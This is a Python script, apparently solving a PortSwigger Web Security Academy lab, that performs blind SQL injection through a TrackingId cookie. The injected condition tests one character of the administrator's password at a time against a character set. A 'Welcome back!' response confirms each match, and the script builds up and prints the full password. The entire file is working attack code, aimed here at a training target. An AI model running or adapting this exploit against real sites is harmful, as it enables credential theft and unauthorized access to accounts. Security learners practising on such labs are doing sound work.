import requests

url = 'https://0a550022036e1f4f83c9b4730099004a.web-security-academy.net/'
headers = {
    'Host': '0a550022036e1f4f83c9b4730099004a.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://portswigger.net/',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Te': 'trailers',
    'Connection': 'close'
}

a = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:,.<>?/`~'
counter = 1
password = "" # this contains the password that's enumerated

for c in range(0, 20): # length 20 as we make sure of that using LENGTH and comparing if greater than x length 
    found = False
    for i in a: 
        cookies = {
            'TrackingId': f"1hsBJxHLtUi4dEVd' AND SUBSTRING((SELECT Password FROM users where Username = 'administrator'),{counter},1) = '{i}' -- ",
            'session': 'oWCh7G6O34DPQJ3A10eVs0ZOXhb6pDEb'
        }

        response = requests.get(url, headers=headers, cookies=cookies)
        if "Welcome back!" in response.text:
            password += i
            counter += 1
            print(f"Found {i} character, password so far: {password}")
            found = True
            break  # Exit the inner loop and continue with the next character
        else:
            print(f"Tried {i} character, no match.")

    if not found:
        print("No match found for the current character position. Exiting...")
        break

print(f"Final password: {password}")
